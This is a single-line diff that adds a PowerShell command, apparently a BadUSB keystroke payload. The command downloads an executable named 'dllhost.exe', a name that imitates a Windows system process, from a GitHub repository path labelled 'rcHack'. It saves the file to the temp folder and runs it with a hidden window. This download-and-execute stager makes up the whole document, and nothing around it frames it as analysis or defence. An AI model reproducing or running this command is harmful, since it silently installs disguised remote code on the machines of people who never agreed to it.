@@ -1,0 +1,1 @@
+powershell -Command "$u='https://github.com/MEIR-0-tpg/FlipperBadUSB/raw/main/rcHack/dllhost.exe';$t=Join-Path $env:TEMP 'dllhost.exe';iwr -Uri $u -OutFile $t;sp -FilePath $t -WindowStyle Hidden -Wait"
